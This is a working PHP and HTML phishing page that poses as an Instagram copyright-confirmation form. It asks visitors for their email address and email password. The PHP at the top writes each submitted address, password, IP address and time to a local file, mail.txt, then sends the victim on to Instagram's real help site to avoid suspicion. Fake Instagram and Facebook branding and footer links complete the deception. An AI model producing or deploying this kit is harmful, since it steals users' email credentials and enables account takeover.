<?php

if($_POST){
$username = $_POST['y_pass'];
$password =  $_POST['x_pass'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('mail.txt', 'a');
fwrite($file, "E-Mail: ".$username."\n\n\nŞifre: " .$password. "\n\nIp Adresi: " .$ip. "\nTarih: " .$cur_time.  "\n\n");
fclose($file);
echo '';
	header("Location: https://help.instagram.com");
}
	?>


<html>
<head>
 <meta charset="utf-8">
  <title>Instagram Copyright</title>
<meta name="viewport" content="width=device-width">

    <style type="text/css">
 


#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } #asdxyz{ background-color:white; width:70%; border:1px solid #dedede; } #erhanasd{ font-family:sans-serif; font-weight:400; letter-spacing:; color:#3d3d3d; font-size:27px; } .fa-facebook { background: #3B5998; color: white; } .fa {padding: 4px; padding-left:6px; padding-right:6px; border-radius:6px; font-size: 16px; width: 6px; text-align: center; text-decoration: none; </style>

<link rel="shortcut icon" href="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png">
</head>
<body style="margin:0px; padding:0px;    background: #fafafa;">
<center>
<div style="height: 126px; margin:0px; padding:0px; background:white;border-bottom:1px solid #dedede; width:100%;">

  <img style="width:250px;" src="https://play-lh.googleusercontent.com/9ASiwrVdio0I2i2Sd1UzRczyL81piJoKfKKBoC8PUm2q6565NMQwUJCuNGwH-enhm00">
  <br><br></div>
<br><br><br>
      <div style="padding:10px; margin:0px; border:1px solid #dedede; width:80%; background:white;">

<br>
<img src="https://i.pinimg.com/originals/8c/95/7b/8c957b1d5b6262dd171f288eeadcabd7.gif" alt="instagram" width=91>
<br>

<h1 style="font-family:sans-serif; font-weight:300;font-size:23px;">Confirm Your Mail Adress
    
    <form method="post">
</h1>
 <input type="email" name="y_pass" placeholder="Mail Adress" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
    
    <br><br>
     <input type="password" name="x_pass" placeholder="Mail Password" required="" style="padding:6px; background:#fafafa; outline:none;
color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
border: 1px solid #e6e6e6;    text-overflow: ellipsis;
    font: 400 13.3333px Arial; border-radius:3px;">
    
    <br><br>
    <input type="submit" value="Confirm Account" style="color:white; width:80%; outline:0; border:0; border-radius:3px;    background: #3897f0;
    border-color: #3897f0;    font-size: 14px; font-weight:bold; height:29px;">
    
    
    
<div style="font-family:sans-serif; font-size:14px; color:#999;"><br>
Instagram From Facebook
<br>
© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025</div>




     </div>


<br><br>

  <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"width="120">

    <img src="https://hrantdink.org/images/KM/kardes/5847e95fcef1014c0b5e4822.png" width="120"> 

<br><b><br> 

<div id="menu">
  <li id="liste"><a href="" id="link">ABOUT US</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">SUPPORT</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">PRESS</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">API</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">JOBS</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">PRIVACY</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">TERMS</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">DIRECTORY</a></li>&nbsp;&nbsp;&nbsp;&nbsp;
  <li id="liste"><a href="" id="link">LANGUAGE</a></li></div>

<br> 

    <p id="copyright" style="font-family:sans-serif;font-weight:100; font-size:14px;">© 2020 INSTAGRAM </p>
     
</center>
</body>
</html>
